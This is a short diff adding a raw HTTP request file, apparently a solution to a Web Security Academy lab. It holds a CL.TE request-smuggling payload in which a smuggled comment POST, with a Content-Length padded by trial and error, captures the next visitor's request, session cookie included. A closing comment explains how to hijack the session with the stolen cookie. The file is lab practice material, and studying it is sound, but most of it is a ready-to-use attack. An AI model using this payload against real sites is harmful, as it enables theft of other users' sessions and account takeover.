@@ -1,0 +1,28 @@
+POST /post/comment HTTP/1.1
+Host: aceb1f541e31b632801f054a00c80026.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://aceb1f541e31b632801f054a00c80026.web-security-academy.net/post?postId=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 423
+Connection: keep-alive
+Cookie: session=mtYfl84HiApIKkmzxUOKyjZaF1XQJ6tv
+Upgrade-Insecure-Requests: 1
+Transfer-Encoding: chunked
+
+86 					# The POST request found must submit values. 86 you must calculate yourself!
+csrf=OizV5kfioQFAJI7Ry6RmYSymL5wabpZ0&postId=1&name=kiddie&email=kiddie%40test.com&website=http%3A%2F%2Fwww.kiddie.com&comment=hello
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 690					# Try and error for Content-Length to include users' cookie header
+Cookie: session=mtYfl84HiApIKkmzxUOKyjZaF1XQJ6tv
+
+csrf=OizV5kfioQFAJI7Ry6RmYSymL5wabpZ0&postId=1&name=kiddie&email=kiddie%40test.com&website=http%3A%2F%2Fwww.kiddie.com&comment=
+
+
+// After obtaining the victim's cookie, just use a normal GET request with "Cookie: session=...."
